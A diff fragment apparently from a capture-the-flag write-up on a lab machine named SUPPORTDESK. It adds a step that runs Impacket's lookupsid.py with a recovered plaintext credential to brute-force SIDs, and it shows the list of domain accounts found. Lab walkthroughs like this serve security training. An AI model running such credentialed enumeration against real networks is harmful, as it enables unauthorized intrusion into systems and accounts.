@@ -75,5 +75,24 @@ http://10.10.10.149/issues.php webpage has a user `Hazard` which can be used wit
         C$                                                      NO ACCESS       Default share
         IPC$                                                    READ ONLY       Remote IPC
 ```
+Found some more users via Impacker module lookupsid.py.
+```bash
+❯ python3 /home/kali/.local/bin/lookupsid.py SUPPORTDESK/Hazard:stealth1agent@10.10.10.149
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] Brute forcing SIDs at 10.10.10.149
+[*] StringBinding ncacn_np:10.10.10.149[\pipe\lsarpc]
+[*] Domain SID is: S-1-5-21-4254423774-1266059056-3197185112
+500: SUPPORTDESK\Administrator (SidTypeUser)
+501: SUPPORTDESK\Guest (SidTypeUser)
+503: SUPPORTDESK\DefaultAccount (SidTypeUser)
+504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)
+513: SUPPORTDESK\None (SidTypeGroup)
+1008: SUPPORTDESK\Hazard (SidTypeUser)
+1009: SUPPORTDESK\support (SidTypeUser)
+1012: SUPPORTDESK\Chase (SidTypeUser)
+1013: SUPPORTDESK\Jason (SidTypeUser)
+```
+
 
 
